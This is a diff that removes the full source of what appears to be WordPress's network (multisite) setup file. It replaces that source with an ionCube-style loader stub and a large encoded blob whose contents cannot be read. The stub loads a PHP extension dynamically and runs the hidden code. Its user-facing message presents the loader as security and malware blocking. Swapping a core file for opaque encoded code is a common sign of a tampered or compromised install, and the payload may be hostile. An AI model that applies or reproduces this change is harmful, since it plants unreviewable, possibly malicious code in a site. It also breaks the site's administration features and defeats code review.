@@ -1,606 +1,354 @@
-<?php
-/**
- * WordPress Network Administration API.
- *
- * @package WordPress
- * @subpackage Administration
- * @since 4.4.0
- */
-
-/**
- * Check for an existing network.
- *
- * @since 3.0.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @return Whether a network exists.
- */
-function network_domain_check() {
-	global $wpdb;
-
-	$sql = $wpdb->prepare( "SHOW TABLES LIKE %s", $wpdb->esc_like( $wpdb->site ) );
-	if ( $wpdb->get_var( $sql ) ) {
-		return $wpdb->get_var( "SELECT domain FROM $wpdb->site ORDER BY id ASC LIMIT 1" );
-	}
-	return false;
-}
-
-/**
- * Allow subdomain installation
- *
- * @since 3.0.0
- * @return bool Whether subdomain installation is allowed
- */
-function allow_subdomain_install() {
-	$domain = preg_replace( '|https?://([^/]+)|', '$1', get_option( 'home' ) );
-	if ( parse_url( get_option( 'home' ), PHP_URL_PATH ) || 'localhost' == $domain || preg_match( '|^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$|', $domain ) )
-		return false;
-
-	return true;
-}
-
-/**
- * Allow subdirectory installation.
- *
- * @since 3.0.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @return bool Whether subdirectory installation is allowed
- */
-function allow_subdirectory_install() {
-	global $wpdb;
-        /**
-         * Filters whether to enable the subdirectory installation feature in Multisite.
-         *
-         * @since 3.0.0
-         *
-         * @param bool $allow Whether to enable the subdirectory installation feature in Multisite. Default is false.
-         */
-	if ( apply_filters( 'allow_subdirectory_install', false ) )
-		return true;
-
-	if ( defined( 'ALLOW_SUBDIRECTORY_INSTALL' ) && ALLOW_SUBDIRECTORY_INSTALL )
-		return true;
-
-	$post = $wpdb->get_row( "SELECT ID FROM $wpdb->posts WHERE post_date < DATE_SUB(NOW(), INTERVAL 1 MONTH) AND post_status = 'publish'" );
-	if ( empty( $post ) )
-		return true;
-
-	return false;
-}
-
-/**
- * Get base domain of network.
- *
- * @since 3.0.0
- * @return string Base domain.
- */
-function get_clean_basedomain() {
-	if ( $existing_domain = network_domain_check() )
-		return $existing_domain;
-	$domain = preg_replace( '|https?://|', '', get_option( 'siteurl' ) );
-	if ( $slash = strpos( $domain, '/' ) )
-		$domain = substr( $domain, 0, $slash );
-	return $domain;
-}
-
-/**
- * Prints step 1 for Network installation process.
- *
- * @todo Realistically, step 1 should be a welcome screen explaining what a Network is and such. Navigating to Tools > Network
- * 	should not be a sudden "Welcome to a new install process! Fill this out and click here." See also contextual help todo.
- *
- * @since 3.0.0
- *
- * @global bool $is_apache
- *
- * @param WP_Error $errors
- */
-function network_step1( $errors = false ) {
-	global $is_apache;
-
-	if ( defined('DO_NOT_UPGRADE_GLOBAL_TABLES') ) {
-		echo '<div class="error"><p><strong>' . __( 'ERROR:' ) . '</strong> ' . sprintf(
-			/* translators: %s: DO_NOT_UPGRADE_GLOBAL_TABLES */
-			__( 'The constant %s cannot be defined when creating a network.' ),
-			'<code>DO_NOT_UPGRADE_GLOBAL_TABLES</code>'
-		) . '</p></div>';
-		echo '</div>';
-		include( ABSPATH . 'wp-admin/admin-footer.php' );
-		die();
-	}
-
-	$active_plugins = get_option( 'active_plugins' );
-	if ( ! empty( $active_plugins ) ) {
-		echo '<div class="updated"><p><strong>' . __( 'Warning:' ) . '</strong> ' . sprintf(
-			/* translators: %s: Plugins screen URL */
-			__( 'Please <a href="%s">deactivate your plugins</a> before enabling the Network feature.' ),
-			admin_url( 'plugins.php?plugin_status=active' )
-		) . '</p></div>';
-		echo '<p>' . __( 'Once the network is created, you may reactivate your plugins.' ) . '</p>';
-		echo '</div>';
-		include( ABSPATH . 'wp-admin/admin-footer.php' );
-		die();
-	}
-
-	$hostname = get_clean_basedomain();
-	$has_ports = strstr( $hostname, ':' );
-	if ( ( false !== $has_ports && ! in_array( $has_ports, array( ':80', ':443' ) ) ) ) {
-		echo '<div class="error"><p><strong>' . __( 'ERROR:' ) . '</strong> ' . __( 'You cannot install a network of sites with your server address.' ) . '</p></div>';
-		echo '<p>' . sprintf(
-			/* translators: %s: port number */
-			__( 'You cannot use port numbers such as %s.' ),
-			'<code>' . $has_ports . '</code>'
-		) . '</p>';
-		echo '<a href="' . esc_url( admin_url() ) . '">' . __( 'Return to Dashboard' ) . '</a>';
-		echo '</div>';
-		include( ABSPATH . 'wp-admin/admin-footer.php' );
-		die();
-	}
-
-	echo '<form method="post">';
-
-	wp_nonce_field( 'install-network-1' );
-
-	$error_codes = array();
-	if ( is_wp_error( $errors ) ) {
-		echo '<div class="error"><p><strong>' . __( 'ERROR: The network could not be created.' ) . '</strong></p>';
-		foreach ( $errors->get_error_messages() as $error )
-			echo "<p>$error</p>";
-		echo '</div>';
-		$error_codes = $errors->get_error_codes();
-	}
-
-	if ( ! empty( $_POST['sitename'] ) && ! in_array( 'empty_sitename', $error_codes ) ) {
-		$site_name = $_POST['sitename'];
-	} else {
-		/* translators: %s: Default network name */
-		$site_name = sprintf( __( '%s Sites' ), get_option( 'blogname' ) );
-	}
-
-	if ( ! empty( $_POST['email'] ) && ! in_array( 'invalid_email', $error_codes ) ) {
-		$admin_email = $_POST['email'];
-	} else {
-		$admin_email = get_option( 'admin_email' );
-	}
-	?>
-	<p><?php _e( 'Welcome to the Network installation process!' ); ?></p>
-	<p><?php _e( 'Fill in the information below and you&#8217;ll be on your way to creating a network of WordPress sites. We will create configuration files in the next step.' ); ?></p>
-	<?php
-
-	if ( isset( $_POST['subdomain_install'] ) ) {
-		$subdomain_install = (bool) $_POST['subdomain_install'];
-	} elseif ( apache_mod_loaded('mod_rewrite') ) { // assume nothing
-		$subdomain_install = true;
-	} elseif ( !allow_subdirectory_install() ) {
-		$subdomain_install = true;
-	} else {
-		$subdomain_install = false;
-		if ( $got_mod_rewrite = got_mod_rewrite() ) { // dangerous assumptions
-			echo '<div class="updated inline"><p><strong>' . __( 'Note:' ) . '</strong> ';
-			/* translators: %s: mod_rewrite */
-			printf( __( 'Please make sure the Apache %s module is installed as it will be used at the end of this installation.' ),
-				'<code>mod_rewrite</code>'
-			);
-			echo '</p>';
-		} elseif ( $is_apache ) {
-			echo '<div class="error inline"><p><strong>' . __( 'Warning:' ) . '</strong> ';
-			/* translators: %s: mod_rewrite */
-			printf( __( 'It looks like the Apache %s module is not installed.' ),
-				'<code>mod_rewrite</code>'
-			);
-			echo '</p>';
-		}
-
-		if ( $got_mod_rewrite || $is_apache ) { // Protect against mod_rewrite mimicry (but ! Apache)
-			echo '<p>';
-			/* translators: 1: mod_rewrite, 2: mod_rewrite documentation URL, 3: Google search for mod_rewrite */
-			printf( __( 'If %1$s is disabled, ask your administrator to enable that module, or look at the <a href="%2$s">Apache documentation</a> or <a href="%3$s">elsewhere</a> for help setting it up.' ),
-				'<code>mod_rewrite</code>',
-				'https://httpd.apache.org/docs/mod/mod_rewrite.html',
-				'https://www.google.com/search?q=apache+mod_rewrite'
-			);
-			echo '</p></div>';
-		}
-	}
-
-	if ( allow_subdomain_install() && allow_subdirectory_install() ) : ?>
-		<h3><?php esc_html_e( 'Addresses of Sites in your Network' ); ?></h3>
-		<p><?php _e( 'Please choose whether you would like sites in your WordPress network to use sub-domains or sub-directories.' ); ?>
-			<strong><?php _e( 'You cannot change this later.' ); ?></strong></p>
-		<p><?php _e( 'You will need a wildcard DNS record if you are going to use the virtual host (sub-domain) functionality.' ); ?></p>
-		<?php // @todo: Link to an MS readme? ?>
-		<table class="form-table">
-			<tr>
-				<th><label><input type="radio" name="subdomain_install" value="1"<?php checked( $subdomain_install ); ?> /> <?php _e( 'Sub-domains' ); ?></label></th>
-				<td><?php printf(
-					/* translators: 1: hostname */
-					_x( 'like <code>site1.%1$s</code> and <code>site2.%1$s</code>', 'subdomain examples' ),
-					$hostname
-				); ?></td>
-			</tr>
-			<tr>
-				<th><label><input type="radio" name="subdomain_install" value="0"<?php checked( ! $subdomain_install ); ?> /> <?php _e( 'Sub-directories' ); ?></label></th>
-				<td><?php printf(
-					/* translators: 1: hostname */
-					_x( 'like <code>%1$s/site1</code> and <code>%1$s/site2</code>', 'subdirectory examples' ),
-					$hostname
-				); ?></td>
-			</tr>
-		</table>
-
-<?php
-	endif;
-
-		if ( WP_CONTENT_DIR != ABSPATH . 'wp-content' && ( allow_subdirectory_install() || ! allow_subdomain_install() ) )
-			echo '<div class="error inline"><p><strong>' . __( 'Warning:' ) . '</strong> ' . __( 'Subdirectory networks may not be fully compatible with custom wp-content directories.' ) . '</p></div>';
-
-		$is_www = ( 0 === strpos( $hostname, 'www.' ) );
-		if ( $is_www ) :
-		?>
-		<h3><?php esc_html_e( 'Server Address' ); ?></h3>
-		<p><?php printf(
-			/* translators: 1: site url 2: host name 3. www */
-			__( 'We recommend you change your siteurl to %1$s before enabling the network feature. It will still be possible to visit your site using the %3$s prefix with an address like %2$s but any links will not have the %3$s prefix.' ),
-			'<code>' . substr( $hostname, 4 ) . '</code>',
-			'<code>' . $hostname . '</code>',
-			'<code>www</code>'
-		); ?></p>
-		<table class="form-table">
-			<tr>
-				<th scope='row'><?php esc_html_e( 'Server Address' ); ?></th>
-				<td>
-					<?php printf(
-						/* translators: %s: host name */
-						__( 'The internet address of your network will be %s.' ),
-						'<code>' . $hostname . '</code>'
-					); ?>
-				</td>
-			</tr>
-		</table>
-		<?php endif; ?>
-
-		<h3><?php esc_html_e( 'Network Details' ); ?></h3>
-		<table class="form-table">
-		<?php if ( 'localhost' == $hostname ) : ?>
-			<tr>
-				<th scope="row"><?php esc_html_e( 'Sub-directory Installation' ); ?></th>
-				<td><?php
-					printf(
-						/* translators: 1: localhost 2: localhost.localdomain */
-						__( 'Because you are using %1$s, the sites in your WordPress network must use sub-directories. Consider using %2$s if you wish to use sub-domains.' ),
-						'<code>localhost</code>',
-						'<code>localhost.localdomain</code>'
-					);
-					// Uh oh:
-					if ( !allow_subdirectory_install() )
-						echo ' <strong>' . __( 'Warning:' ) . ' ' . __( 'The main site in a sub-directory installation will need to use a modified permalink structure, potentially breaking existing links.' ) . '</strong>';
-				?></td>
-			</tr>
-		<?php elseif ( !allow_subdomain_install() ) : ?>
-			<tr>
-				<th scope="row"><?php esc_html_e( 'Sub-directory Installation' ); ?></th>
-				<td><?php
-					_e( 'Because your installation is in a directory, the sites in your WordPress network must use sub-directories.' );
-					// Uh oh:
-					if ( !allow_subdirectory_install() )
-						echo ' <strong>' . __( 'Warning:' ) . ' ' . __( 'The main site in a sub-directory installation will need to use a modified permalink structure, potentially breaking existing links.' ) . '</strong>';
-				?></td>
-			</tr>
-		<?php elseif ( !allow_subdirectory_install() ) : ?>
-			<tr>
-				<th scope="row"><?php esc_html_e( 'Sub-domain Installation' ); ?></th>
-				<td><?php _e( 'Because your installation is not new, the sites in your WordPress network must use sub-domains.' );
-					echo ' <strong>' . __( 'The main site in a sub-directory installation will need to use a modified permalink structure, potentially breaking existing links.' ) . '</strong>';
-				?></td>
-			</tr>
-		<?php endif; ?>
-		<?php if ( ! $is_www ) : ?>
-			<tr>
-				<th scope='row'><?php esc_html_e( 'Server Address' ); ?></th>
-				<td>
-					<?php printf(
-						/* translators: %s: host name */
-						__( 'The internet address of your network will be %s.' ),
-						'<code>' . $hostname . '</code>'
-					); ?>
-				</td>
-			</tr>
-		<?php endif; ?>
-			<tr>
-				<th scope='row'><?php esc_html_e( 'Network Title' ); ?></th>
-				<td>
-					<input name='sitename' type='text' size='45' value='<?php echo esc_attr( $site_name ); ?>' />
-					<p class="description">
-						<?php _e( 'What would you like to call your network?' ); ?>
-					</p>
-				</td>
-			</tr>
-			<tr>
-				<th scope='row'><?php esc_html_e( 'Network Admin Email' ); ?></th>
-				<td>
-					<input name='email' type='text' size='45' value='<?php echo esc_attr( $admin_email ); ?>' />
-					<p class="description">
-						<?php _e( 'Your email address.' ); ?>
-					</p>
-				</td>
-			</tr>
-		</table>
-		<?php submit_button( __( 'Install' ), 'primary', 'submit' ); ?>
-	</form>
-	<?php
-}
-
-/**
- * Prints step 2 for Network installation process.
- *
- * @since 3.0.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @param WP_Error $errors
- */
-function network_step2( $errors = false ) {
-	global $wpdb;
-
-	$hostname          = get_clean_basedomain();
-	$slashed_home      = trailingslashit( get_option( 'home' ) );
-	$base              = parse_url( $slashed_home, PHP_URL_PATH );
-	$document_root_fix = str_replace( '\\', '/', realpath( $_SERVER['DOCUMENT_ROOT'] ) );
-	$abspath_fix       = str_replace( '\\', '/', ABSPATH );
-	$home_path         = 0 === strpos( $abspath_fix, $document_root_fix ) ? $document_root_fix . $base : get_home_path();
-	$wp_siteurl_subdir = preg_replace( '#^' . preg_quote( $home_path, '#' ) . '#', '', $abspath_fix );
-	$rewrite_base      = ! empty( $wp_siteurl_subdir ) ? ltrim( trailingslashit( $wp_siteurl_subdir ), '/' ) : '';
-
-
-	$location_of_wp_config = $abspath_fix;
-	if ( ! file_exists( ABSPATH . 'wp-config.php' ) && file_exists( dirname( ABSPATH ) . '/wp-config.php' ) ) {
-		$location_of_wp_config = dirname( $abspath_fix );
-	}
-	$location_of_wp_config = trailingslashit( $location_of_wp_config );
-
-	// Wildcard DNS message.
-	if ( is_wp_error( $errors ) )
-		echo '<div class="error">' . $errors->get_error_message() . '</div>';
-
-	if ( $_POST ) {
-		if ( allow_subdomain_install() )
-			$subdomain_install = allow_subdirectory_install() ? ! empty( $_POST['subdomain_install'] ) : true;
-		else
-			$subdomain_install = false;
-	} else {
-		if ( is_multisite() ) {
-			$subdomain_install = is_subdomain_install();
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-	<p><?php _e( 'The original configuration steps are shown here for reference.' ); ?></p>
-<?php
-		} else {
-			$subdomain_install = (bool) $wpdb->get_var( "SELECT meta_value FROM $wpdb->sitemeta WHERE site_id = 1 AND meta_key = 'subdomain_install'" );
-?>
-	<div class="error"><p><strong><?php _e( 'Warning:' ); ?></strong> <?php _e( 'An existing WordPress network was detected.' ); ?></p></div>
-	<p><?php _e( 'Please complete the configuration steps. To create a new network, you will need to empty or remove the network database tables.' ); ?></p>
-<?php
-		}
-	}
-
-	$subdir_match          = $subdomain_install ? '' : '([_0-9a-zA-Z-]+/)?';
-	$subdir_replacement_01 = $subdomain_install ? '' : '$1';
-	$subdir_replacement_12 = $subdomain_install ? '$1' : '$2';
-
-	if ( $_POST || ! is_multisite() ) {
-?>
-		<h3><?php esc_html_e( 'Enabling the Network' ); ?></h3>
-		<p><?php _e( 'Complete the following steps to enable the features for creating a network of sites.' ); ?></p>
-		<div class="updated inline"><p><?php
-			if ( file_exists( $home_path . '.htaccess' ) ) {
-				echo '<strong>' . __( 'Caution:' ) . '</strong> ';
-				printf(
-					/* translators: 1: wp-config.php 2: .htaccess */
-					__( 'We recommend you back up your existing %1$s and %2$s files.' ),
-					'<code>wp-config.php</code>',
-					'<code>.htaccess</code>'
-				);
-			} elseif ( file_exists( $home_path . 'web.config' ) ) {
-				echo '<strong>' . __( 'Caution:' ) . '</strong> ';
-				printf(
-					/* translators: 1: wp-config.php 2: web.config */
-					__( 'We recommend you back up your existing %1$s and %2$s files.' ),
-					'<code>wp-config.php</code>',
-					'<code>web.config</code>'
-				);
-			} else {
-				echo '<strong>' . __( 'Caution:' ) . '</strong> ';
-				printf(
-					/* translators: 1: wp-config.php */
-					__( 'We recommend you back up your existing %s file.' ),
-					'<code>wp-config.php</code>'
-				);
-			}
-		?></p></div>
-<?php
-	}
-?>
-		<ol>
-			<li><p><?php printf(
-				/* translators: 1: wp-config.php 2: location of wp-config file, 3: translated version of "That's all, stop editing! Happy blogging." */
-				__( 'Add the following to your %1$s file in %2$s <strong>above</strong> the line reading %3$s:' ),
-				'<code>wp-config.php</code>',
-				'<code>' . $location_of_wp_config . '</code>',
-				/*
-				 * translators: This string should only be translated if wp-config-sample.php is localized.
-				 * You can check the localized release package or
-				 * https://i18n.svn.wordpress.org/<locale code>/branches/<wp version>/dist/wp-config-sample.php
-				 */
-				'<code>/* ' . __( 'That&#8217;s all, stop editing! Happy blogging.' ) . ' */</code>'
-			); ?></p>
-				<textarea class="code" readonly="readonly" cols="100" rows="7">
-define('MULTISITE', true);
-define('SUBDOMAIN_INSTALL', <?php echo $subdomain_install ? 'true' : 'false'; ?>);
-define('DOMAIN_CURRENT_SITE', '<?php echo $hostname; ?>');
-define('PATH_CURRENT_SITE', '<?php echo $base; ?>');
-define('SITE_ID_CURRENT_SITE', 1);
-define('BLOG_ID_CURRENT_SITE', 1);
-</textarea>
-<?php
-	$keys_salts = array( 'AUTH_KEY' => '', 'SECURE_AUTH_KEY' => '', 'LOGGED_IN_KEY' => '', 'NONCE_KEY' => '', 'AUTH_SALT' => '', 'SECURE_AUTH_SALT' => '', 'LOGGED_IN_SALT' => '', 'NONCE_SALT' => '' );
-	foreach ( $keys_salts as $c => $v ) {
-		if ( defined( $c ) )
-			unset( $keys_salts[ $c ] );
-	}
-
-	if ( ! empty( $keys_salts ) ) {
-		$keys_salts_str = '';
-		$from_api = wp_remote_get( 'https://api.wordpress.org/secret-key/1.1/salt/' );
-		if ( is_wp_error( $from_api ) ) {
-			foreach ( $keys_salts as $c => $v ) {
-				$keys_salts_str .= "\ndefine( '$c', '" . wp_generate_password( 64, true, true ) . "' );";
-			}
-		} else {
-			$from_api = explode( "\n", wp_remote_retrieve_body( $from_api ) );
-			foreach ( $keys_salts as $c => $v ) {
-				$keys_salts_str .= "\ndefine( '$c', '" . substr( array_shift( $from_api ), 28, 64 ) . "' );";
-			}
-		}
-		$num_keys_salts = count( $keys_salts );
-?>
-	<p>
-		<?php
-			if ( 1 == $num_keys_salts ) {
-				printf(
-					/* translators: 1: wp-config.php */
-					__( 'This unique authentication key is also missing from your %s file.' ),
-					'<code>wp-config.php</code>'
-				);
-			} else {
-				printf(
-					/* translators: 1: wp-config.php */
-					__( 'These unique authentication keys are also missing from your %s file.' ),
-					'<code>wp-config.php</code>'
-				);
-			}
-		?>
-		<?php _e( 'To make your installation more secure, you should also add:' ); ?>
-	</p>
-	<textarea class="code" readonly="readonly" cols="100" rows="<?php echo $num_keys_salts; ?>"><?php echo esc_textarea( $keys_salts_str ); ?></textarea>
-<?php
-	}
-?>
-</li>
-<?php
-	if ( iis7_supports_permalinks() ) :
-		// IIS doesn't support RewriteBase, all your RewriteBase are belong to us
-		$iis_subdir_match = ltrim( $base, '/' ) . $subdir_match;
-		$iis_rewrite_base = ltrim( $base, '/' ) . $rewrite_base;
-		$iis_subdir_replacement = $subdomain_install ? '' : '{R:1}';
-
-		$web_config_file = '<?xml version="1.0" encoding="UTF-8"?>
-<configuration>
-    <system.webServer>
-        <rewrite>
-            <rules>
-                <rule name="WordPress Rule 1" stopProcessing="true">
-                    <match url="^index\.php$" ignoreCase="false" />
-                    <action type="None" />
-                </rule>';
-				if ( is_multisite() && get_site_option( 'ms_files_rewriting' ) ) {
-					$web_config_file .= '
-                <rule name="WordPress Rule for Files" stopProcessing="true">
-                    <match url="^' . $iis_subdir_match . 'files/(.+)" ignoreCase="false" />
-                    <action type="Rewrite" url="' . $iis_rewrite_base . WPINC . '/ms-files.php?file={R:1}" appendQueryString="false" />
-                </rule>';
-                }
-                $web_config_file .= '
-                <rule name="WordPress Rule 2" stopProcessing="true">
-                    <match url="^' . $iis_subdir_match . 'wp-admin$" ignoreCase="false" />
-                    <action type="Redirect" url="' . $iis_subdir_replacement . 'wp-admin/" redirectType="Permanent" />
-                </rule>
-                <rule name="WordPress Rule 3" stopProcessing="true">
-                    <match url="^" ignoreCase="false" />
-                    <conditions logicalGrouping="MatchAny">
-                        <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" />
-                        <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" />
-                    </conditions>
-                    <action type="None" />
-                </rule>
-                <rule name="WordPress Rule 4" stopProcessing="true">
-                    <match url="^' . $iis_subdir_match . '(wp-(content|admin|includes).*)" ignoreCase="false" />
-                    <action type="Rewrite" url="' . $iis_rewrite_base . '{R:1}" />
-                </rule>
-                <rule name="WordPress Rule 5" stopProcessing="true">
-                    <match url="^' . $iis_subdir_match . '([_0-9a-zA-Z-]+/)?(.*\.php)$" ignoreCase="false" />
-                    <action type="Rewrite" url="' . $iis_rewrite_base . '{R:2}" />
-                </rule>
-                <rule name="WordPress Rule 6" stopProcessing="true">
-                    <match url="." ignoreCase="false" />
-                    <action type="Rewrite" url="index.php" />
-                </rule>
-            </rules>
-        </rewrite>
-    </system.webServer>
-</configuration>
-';
-
-		echo '<li><p>';
-		printf(
-			/* translators: 1: a filename like .htaccess. 2: a file path. */
-			__( 'Add the following to your %1$s file in %2$s, <strong>replacing</strong> other WordPress rules:' ),
-			'<code>web.config</code>',
-			'<code>' . $home_path . '</code>'
-		);
-		echo '</p>';
-		if ( ! $subdomain_install && WP_CONTENT_DIR != ABSPATH . 'wp-content' )
-			echo '<p><strong>' . __( 'Warning:' ) . ' ' . __( 'Subdirectory networks may not be fully compatible with custom wp-content directories.' ) . '</strong></p>';
-		?>
-		<textarea class="code" readonly="readonly" cols="100" rows="20"><?php echo esc_textarea( $web_config_file ); ?>
-		</textarea></li>
-		</ol>
-
-	<?php else : // end iis7_supports_permalinks(). construct an htaccess file instead:
-
-		$ms_files_rewriting = '';
-		if ( is_multisite() && get_site_option( 'ms_files_rewriting' ) ) {
-			$ms_files_rewriting = "\n# uploaded files\nRewriteRule ^";
-			$ms_files_rewriting .= $subdir_match . "files/(.+) {$rewrite_base}" . WPINC . "/ms-files.php?file={$subdir_replacement_12} [L]" . "\n";
-		}
-
-		$htaccess_file = <<<EOF
-RewriteEngine On
-RewriteBase {$base}
-RewriteRule ^index\.php$ - [L]
-{$ms_files_rewriting}
-# add a trailing slash to /wp-admin
-RewriteRule ^{$subdir_match}wp-admin$ {$subdir_replacement_01}wp-admin/ [R=301,L]
-
-RewriteCond %{REQUEST_FILENAME} -f [OR]
-RewriteCond %{REQUEST_FILENAME} -d
-RewriteRule ^ - [L]
-RewriteRule ^{$subdir_match}(wp-(content|admin|includes).*) {$rewrite_base}{$subdir_replacement_12} [L]
-RewriteRule ^{$subdir_match}(.*\.php)$ {$rewrite_base}$subdir_replacement_12 [L]
-RewriteRule . index.php [L]
-
-EOF;
-
-		echo '<li><p>';
-		printf(
-			/* translators: 1: a filename like .htaccess. 2: a file path. */
-			__( 'Add the following to your %1$s file in %2$s, <strong>replacing</strong> other WordPress rules:' ),
-			'<code>.htaccess</code>',
-			'<code>' . $home_path . '</code>'
-		);
-		echo '</p>';
-		if ( ! $subdomain_install && WP_CONTENT_DIR != ABSPATH . 'wp-content' )
-			echo '<p><strong>' . __( 'Warning:' ) . ' ' . __( 'Subdirectory networks may not be fully compatible with custom wp-content directories.' ) . '</strong></p>';
-		?>
-		<textarea class="code" readonly="readonly" cols="100" rows="<?php echo substr_count( $htaccess_file, "\n" ) + 1; ?>">
-<?php echo esc_textarea( $htaccess_file ); ?></textarea></li>
-		</ol>
-
-	<?php endif; // end IIS/Apache code branches.
-
-	if ( !is_multisite() ) { ?>
-		<p><?php _e( 'Once you complete these steps, your network is enabled and configured. You will have to log in again.' ); ?> <a href="<?php echo esc_url( wp_login_url() ); ?>"><?php _e( 'Log In' ); ?></a></p>
-<?php
-	}
-}
+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
